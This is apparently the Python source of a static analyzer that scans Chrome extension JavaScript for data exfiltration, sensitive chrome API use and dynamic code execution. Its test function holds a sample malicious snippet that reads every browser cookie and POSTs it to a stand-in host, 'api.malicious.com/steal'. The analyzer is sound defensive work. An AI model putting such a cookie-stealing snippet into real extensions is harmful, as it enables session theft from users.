"""
Enhanced JavaScript AST Analyzer with Config Resolution
Resolves CONFIG variables to actual URLs
"""

import esprima
import json
import re
import time
from pathlib import Path
from collections import defaultdict

# #region agent log
import os
_DEBUG_LOG_PATH = r'c:\Users\user2\Documents\GitHub\chrome-extension-security-analyzer\.cursor\debug.log'
def _ast_log(msg, data=None, hypothesis_id=None):
    try:
        os.makedirs(os.path.dirname(_DEBUG_LOG_PATH), exist_ok=True)
        with open(_DEBUG_LOG_PATH, 'a', encoding='utf-8') as _f:
            _f.write(json.dumps({'message': msg, 'data': data or {}, 'timestamp': round(time.time() * 1000), 'location': 'ast_analyzer.py', 'hypothesisId': hypothesis_id}, ensure_ascii=False) + '\n')
    except Exception:
        pass
# #endregion

# Max file size for full AST parsing (larger files skip AST to avoid hangs)
MAX_FILE_SIZE_FOR_AST = 2 * 1024 * 1024  # 2 MiB
# Max recursion depth in AST traversal to prevent runaway / stack overflow
MAX_TRAVERSE_DEPTH = 10000


class JavaScriptASTAnalyzer:
    """Advanced JavaScript analysis with config resolution"""
    
    def __init__(self):
        self.findings = []
        self.data_flows = []
        self.network_calls = []
        self.chrome_api_usage = []
        self.config_values = {}  # Store resolved config values
        
    def analyze_directory(self, extension_dir, progress_callback=None):
        """Analyze all JavaScript files in an extension directory.
        progress_callback: optional callable invoked once per file (for unified progress bar).
        """
        
        extension_dir = Path(extension_dir)
        all_results = {
            'files_analyzed': 0,
            'network_calls': [],
            'data_exfiltration': [],
            'chrome_api_abuse': [],
            'obfuscation': [],
            'suspicious_patterns': []
        }
        
        # Find all JavaScript files, excluding node_modules and similar dependency trees
        all_js = list(extension_dir.rglob('*.js'))
        js_files = [p for p in all_js if 'node_modules' not in p.parts and 'bower_components' not in p.parts]
        if len(js_files) != len(all_js):
            print(f"[AST] Skipping {len(all_js) - len(js_files)} JS file(s) under node_modules/bower_components")
        # #region agent log
        _ast_log('AST analyze_directory started', {'js_file_count': len(js_files), 'large_files': [{'path': str(p.relative_to(extension_dir)), 'size_kb': p.stat().st_size // 1024} for p in js_files if p.stat().st_size > 512 * 1024]}, 'H5')
        # #endregion
        print(f"[AST] Analyzing {len(js_files)} JavaScript files with AST parser...")
        
        # STEP 1: Extract CONFIG values first
        print(f"[AST] Extracting configuration values...")
        self._extract_config_values(js_files)
        
        if self.config_values:
            print(f"[AST] Resolved {len(self.config_values)} configuration URLs:")
            for key, value in list(self.config_values.items())[:5]:
                print(f"[AST]   * {key} -> {value}")
        
        # STEP 2: Analyze each file
        for idx, js_file in enumerate(js_files):
            try:
                # #region agent log
                _rel = str(js_file.relative_to(extension_dir))
                _sz = js_file.stat().st_size
                _t0 = time.perf_counter()
                _ast_log('AST file start', {'index': idx, 'path': _rel, 'size_bytes': _sz, 'size_kb': _sz // 1024}, 'H3')
                # #endregion
                # Skip full AST for very large files to avoid parse/traverse hangs
                if _sz > MAX_FILE_SIZE_FOR_AST:
                    print(f"[AST] Skipping AST for large file ({_sz // 1024} KiB): {_rel}")
                    file_results = self._analyze_file_skipped_large(_rel, _sz)
                else:
                    with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    file_results = self.analyze_file(_rel, content)
                # #region agent log
                _ast_log('AST file done', {'path': _rel, 'elapsed_ms': round((time.perf_counter() - _t0) * 1000)}, 'H1')
                # #endregion
                
                # Aggregate results
                all_results['files_analyzed'] += 1
                all_results['network_calls'].extend(file_results.get('network_calls', []))
                all_results['data_exfiltration'].extend(file_results.get('data_exfiltration', []))
                all_results['chrome_api_abuse'].extend(file_results.get('chrome_api_abuse', []))
                all_results['obfuscation'].extend(file_results.get('obfuscation', []))
                all_results['suspicious_patterns'].extend(file_results.get('suspicious_patterns', []))
                
                if progress_callback:
                    progress_callback()
                
            except Exception as e:
                print(f"[AST] Error analyzing {js_file.name}: {e}")
        
        # Print summary
        if all_results['data_exfiltration']:
            print(f"[AST] [ALERT] Found {len(all_results['data_exfiltration'])} data exfiltration pattern(s)")
            for exfil in all_results['data_exfiltration'][:3]:
                if exfil['destination'] != 'Unknown':
                    print(f"[AST]   -> {exfil['destination']}")
        
        if all_results['chrome_api_abuse']:
            print(f"[AST] [!]  Found {len(all_results['chrome_api_abuse'])} chrome API abuse pattern(s)")
        
        return all_results
    
    # Max size for config extraction (avoid reading huge files and ReDoS on regex)
    _MAX_CONFIG_FILE_SIZE = 512 * 1024  # 512 KiB

    def _extract_config_values(self, js_files):
        """Extract CONFIG variable values from JavaScript files"""
        
        for js_file in js_files:
            # Only check config files
            if 'config' not in js_file.name.lower():
                continue
            try:
                size = js_file.stat().st_size
                if size > self._MAX_CONFIG_FILE_SIZE:
                    continue  # Skip huge files to avoid hang / ReDoS
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(self._MAX_CONFIG_FILE_SIZE)
                
                # Extract base URLs using regex (simpler than AST for this)
                
                # Pattern 1: API_BASE_URL getter
                api_base_match = re.search(r"get\s+API_BASE_URL\s*\(\s*\)\s*\{[^}]*return\s+['\"]([^'\"]+)['\"]", content)
                if api_base_match:
                    base_url = api_base_match.group(1)
                    self.config_values['API_BASE_URL'] = base_url
                
                # Pattern 2: Direct assignment
                api_base_match2 = re.search(r"API_BASE_URL\s*[:=]\s*['\"]([^'\"]+)['\"]", content)
                if api_base_match2:
                    base_url = api_base_match2.group(1)
                    self.config_values['API_BASE_URL'] = base_url
                
                # Pattern 3: Extract endpoint definitions
                # Looking for: GENERATE_REPLY: `${this.API_BASE_URL}/api/generate-reply/`
                endpoint_matches = re.finditer(
                    r"(\w+):\s*`\$\{this\.API_BASE_URL\}(/[^`]+)`",
                    content
                )
                
                base_url = self.config_values.get('API_BASE_URL', '')
                for match in endpoint_matches:
                    endpoint_name = match.group(1)
                    endpoint_path = match.group(2)
                    full_url = base_url + endpoint_path
                    
                    # Store multiple patterns
                    self.config_values[f'CONFIG.ENDPOINTS.{endpoint_name}'] = full_url
                    self.config_values[f'ENDPOINTS.{endpoint_name}'] = full_url
                    self.config_values[endpoint_name] = full_url
                
            except Exception as e:
                continue
    
    def _analyze_file_skipped_large(self, file_path, size_bytes):
        """Return empty AST results for files too large to parse (avoids hang/infinite loop)."""
        return {
            'file': file_path,
            'network_calls': [],
            'data_exfiltration': [],
            'chrome_api_abuse': [],
            'obfuscation': [{
                'type': 'Skipped (file too large)',
                'description': f'AST analysis skipped for file >{MAX_FILE_SIZE_FOR_AST // (1024*1024)} MiB to avoid timeout',
                'severity': 'low'
            }],
            'suspicious_patterns': []
        }
    
    def analyze_file(self, file_path, content):
        """Analyze a JavaScript file using AST"""
        
        results = {
            'file': file_path,
            'network_calls': [],
            'data_exfiltration': [],
            'chrome_api_abuse': [],
            'obfuscation': [],
            'suspicious_patterns': []
        }
        
        try:
            # #region agent log
            _ast_log('AST parseScript before', {'file': file_path, 'content_len': len(content)}, 'H1')
            _t_parse = time.perf_counter()
            # #endregion
            # Parse JavaScript into AST
            ast = esprima.parseScript(content, {'loc': True, 'range': True, 'tolerant': True})
            # #region agent log
            _ast_log('AST parseScript after', {'file': file_path, 'elapsed_ms': round((time.perf_counter() - _t_parse) * 1000)}, 'H1')
            # #endregion
            
            # Analyze the AST
            self._traverse_ast(ast, content, results, depth=0)
            
        except Exception as e:
            # If parsing fails, likely obfuscated or invalid JS
            results['parse_error'] = str(e)
            results['obfuscation'].append({
                'type': 'Parse Failure',
                'description': 'Failed to parse JavaScript - likely obfuscated or malformed',
                'severity': 'high'
            })
        
        return results
    
    def _traverse_ast(self, node, source_code, results, depth=0):
        """Recursively traverse the AST and detect patterns"""
        # #region agent log
        if depth == 2000 or depth == 50000:
            _ast_log('AST traverse depth', {'file': results.get('file'), 'depth': depth}, 'H2')
        # #endregion
        if depth > MAX_TRAVERSE_DEPTH:
            return
        if node is None or not hasattr(node, 'type'):
            return
        
        node_type = node.type
        
        # Detect fetch() calls
        if node_type == 'CallExpression':
            self._analyze_call_expression(node, source_code, results)
        
        # Detect variable assignments (data flow)
        elif node_type == 'VariableDeclaration':
            self._analyze_variable_declaration(node, source_code, results)
        
        # Detect chrome API usage
        elif node_type == 'MemberExpression':
            self._analyze_member_expression(node, source_code, results)
        
        # Recursively traverse child nodes
        for key in dir(node):
            if key.startswith('_'):
                continue
            
            value = getattr(node, key, None)
            
            if isinstance(value, list):
                for item in value:
                    if hasattr(item, 'type'):
                        self._traverse_ast(item, source_code, results, depth + 1)
            elif hasattr(value, 'type'):
                self._traverse_ast(value, source_code, results, depth + 1)
    
    def _analyze_call_expression(self, node, source_code, results):
        """Analyze function calls (fetch, XMLHttpRequest, etc.)"""
        
        # Get the function being called
        callee = self._get_node_name(node.callee)
        
        # Detect fetch() calls
        if 'fetch' in callee.lower():
            fetch_analysis = self._analyze_fetch_call(node, source_code)
            if fetch_analysis:
                # CRITICAL: Resolve URL if it's a config reference
                url = fetch_analysis.get('url', 'Unknown')
                resolved_url = self._resolve_config_reference(url)
                fetch_analysis['url'] = resolved_url
                
                results['network_calls'].append(fetch_analysis)
                
                # If it's a POST with data, it's likely exfiltration
                if fetch_analysis.get('method') == 'POST':
                    results['data_exfiltration'].append({
                        'type': 'Data Exfiltration via POST',
                        'destination': resolved_url,  # RESOLVED URL!
                        'method': 'POST',
                        'data_source': fetch_analysis.get('body_source', 'Unknown'),
                        'severity': 'critical',
                        'file': results.get('file', 'Unknown'),  # Include filename
                        'line': node.loc.start.line if hasattr(node, 'loc') else 0,
                        'evidence': self._get_code_snippet(source_code, node)
                    })
        
        # Detect XMLHttpRequest
        elif 'xmlhttprequest' in callee.lower():
            results['network_calls'].append({
                'type': 'XMLHttpRequest',
                'line': node.loc.start.line if hasattr(node, 'loc') else 0,
                'severity': 'medium'
            })
        
        # Detect WebSocket
        elif 'websocket' in callee.lower():
            results['network_calls'].append({
                'type': 'WebSocket',
                'line': node.loc.start.line if hasattr(node, 'loc') else 0,
                'severity': 'high'
            })
        
        # Detect eval and dynamic code execution
        elif callee in ['eval', 'Function']:
            results['suspicious_patterns'].append({
                'type': 'Dynamic Code Execution',
                'pattern': callee,
                'severity': 'high',
                'line': node.loc.start.line if hasattr(node, 'loc') else 0,
                'evidence': self._get_code_snippet(source_code, node)
            })
    
    def _resolve_config_reference(self, url_or_ref):
        """Resolve config variable reference to actual URL"""
        
        if url_or_ref == 'Unknown' or not url_or_ref:
            return 'Unknown'
        
        # If it's already a URL, return it
        if url_or_ref.startswith('http://') or url_or_ref.startswith('https://'):
            return url_or_ref
        
        # Try to resolve it from config values
        # Check various patterns
        patterns = [
            url_or_ref,  # Exact match
            url_or_ref.replace('<variable: ', '').replace('>', ''),  # Strip <variable: >
            f'CONFIG.{url_or_ref}',
            f'ENDPOINTS.{url_or_ref}',
        ]
        
        for pattern in patterns:
            if pattern in self.config_values:
                resolved = self.config_values[pattern]
                print(f"[AST] Resolved {url_or_ref} -> {resolved}")
                return resolved
        
        return url_or_ref  # Return as-is if not resolved
    
    def _analyze_fetch_call(self, node, source_code):
        """Analyze a fetch() call to extract URL and method"""
        
        if not node.arguments or len(node.arguments) == 0:
            return None
        
        # First argument is the URL
        url_arg = node.arguments[0]
        url = self._extract_string_value(url_arg)
        
        # Second argument is options object
        method = 'GET'  # Default
        body_source = None
        
        if len(node.arguments) > 1:
            options = node.arguments[1]
            
            # Parse options object
            if hasattr(options, 'type') and options.type == 'ObjectExpression':
                for prop in options.properties:
                    key = self._get_node_name(prop.key)
                    
                    if key == 'method':
                        method = self._extract_string_value(prop.value)
                    
                    elif key == 'body':
                        body_source = self._get_node_name(prop.value)
        
        return {
            'type': 'fetch',
            'url': url,
            'method': method,
            'body_source': body_source,
            'line': node.loc.start.line if hasattr(node, 'loc') else 0,
            'evidence': self._get_code_snippet(source_code, node)
        }
    
    def _analyze_member_expression(self, node, source_code, results):
        """Analyze member expressions (e.g., chrome.cookies.getAll)"""
        
        full_name = self._get_node_name(node)
        
        # Detect chrome API usage
        if full_name.startswith('chrome.'):
            
            # Cookie access
            if 'chrome.cookies' in full_name:
                results['chrome_api_abuse'].append({
                    'api': full_name,
                    'type': 'Cookie Access',
                    'severity': 'critical',
                    'description': 'Accesses browser cookies (potential session theft)',
                    'line': node.loc.start.line if hasattr(node, 'loc') else 0
                })
            
            # Tab access
            elif 'chrome.tabs' in full_name:
                results['chrome_api_abuse'].append({
                    'api': full_name,
                    'type': 'Tab Access',
                    'severity': 'high',
                    'description': 'Accesses tab information',
                    'line': node.loc.start.line if hasattr(node, 'loc') else 0
                })
            
            # History access
            elif 'chrome.history' in full_name:
                results['chrome_api_abuse'].append({
                    'api': full_name,
                    'type': 'History Access',
                    'severity': 'high',
                    'description': 'Accesses browsing history',
                    'line': node.loc.start.line if hasattr(node, 'loc') else 0
                })
            
            # WebRequest (traffic interception)
            elif 'chrome.webRequest' in full_name:
                results['chrome_api_abuse'].append({
                    'api': full_name,
                    'type': 'Traffic Interception',
                    'severity': 'critical',
                    'description': 'Can intercept and modify network traffic',
                    'line': node.loc.start.line if hasattr(node, 'loc') else 0
                })
            
            # Runtime messaging
            elif 'chrome.runtime.sendMessage' in full_name:
                results['chrome_api_abuse'].append({
                    'api': full_name,
                    'type': 'Message Passing',
                    'severity': 'medium',
                    'description': 'Sends messages to background script',
                    'line': node.loc.start.line if hasattr(node, 'loc') else 0
                })
    
    def _analyze_variable_declaration(self, node, source_code, results):
        """Analyze variable declarations for data flow"""
        pass
    
    def _get_node_name(self, node):
        """Get the full name of a node (e.g., chrome.cookies.getAll or CONFIG.ENDPOINTS.GENERATE_REPLY)"""
        
        if node is None:
            return ''
        
        node_type = getattr(node, 'type', '')
        
        if node_type == 'Identifier':
            return getattr(node, 'name', '')
        
        elif node_type == 'MemberExpression':
            obj = self._get_node_name(getattr(node, 'object', None))
            prop = self._get_node_name(getattr(node, 'property', None))
            return f"{obj}.{prop}" if obj and prop else obj or prop
        
        elif node_type == 'Literal':
            return str(getattr(node, 'value', ''))
        
        elif node_type == 'CallExpression':
            return self._get_node_name(getattr(node, 'callee', None))
        
        return ''
    
    def _extract_string_value(self, node):
        """Extract string value from a node"""
        
        if node is None:
            return 'Unknown'
        
        node_type = getattr(node, 'type', '')
        
        if node_type == 'Literal':
            return str(getattr(node, 'value', 'Unknown'))
        
        elif node_type == 'TemplateLiteral':
            parts = []
            for quasi in getattr(node, 'quasis', []):
                parts.append(getattr(quasi, 'value', {}).get('raw', ''))
            return ''.join(parts) + ' (template literal)'
        
        elif node_type == 'BinaryExpression':
            left = self._extract_string_value(getattr(node, 'left', None))
            right = self._extract_string_value(getattr(node, 'right', None))
            return f"{left} + {right}"
        
        elif node_type == 'Identifier' or node_type == 'MemberExpression':
            # Return the variable/config reference
            var_name = self._get_node_name(node)
            return f"<variable: {var_name}>"
        
        return 'Unknown'
    
    def _get_code_snippet(self, source_code, node, context_lines=6):
        """Extract code snippet around a node"""
        
        if not hasattr(node, 'loc'):
            return ''
        
        try:
            lines = source_code.split('\n')
            start_line = max(0, node.loc.start.line - context_lines - 1)
            end_line = min(len(lines), node.loc.end.line + context_lines)
            
            snippet_lines = lines[start_line:end_line]
            return '\n'.join(snippet_lines)
        except:
            return ''


def test_ast_analyzer():
    """Test the enhanced AST analyzer"""
    
    test_code = """
    // Config
    const CONFIG = {
      get API_BASE_URL() {
        return 'https://api.malicious.com';
      },
      get ENDPOINTS() {
        return {
          STEAL: `${this.API_BASE_URL}/steal`
        };
      }
    };
    
    // Steal cookies
    chrome.cookies.getAll({}, function(cookies) {
        const data = JSON.stringify(cookies);
        
        fetch(CONFIG.ENDPOINTS.STEAL, {
            method: 'POST',
            body: data
        });
    });
    """
    
    analyzer = JavaScriptASTAnalyzer()
    results = analyzer.analyze_file('test.js', test_code)
    
    print("\n=== Enhanced AST Analysis Test ===\n")
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    test_ast_analyzer()